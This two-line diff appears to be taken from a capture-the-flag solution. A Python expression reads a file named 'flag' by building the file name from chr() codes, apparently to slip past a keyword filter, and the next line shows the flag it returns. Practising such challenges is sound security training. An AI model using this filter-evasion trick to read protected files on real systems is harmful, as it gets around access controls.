@@ -1,0 +1,2 @@
+> list(open(chr(102)+chr(108)+chr(97)+chr(103)))
+['flag{vuln3r4b1l17y_45_4_53rv1c3}\n']
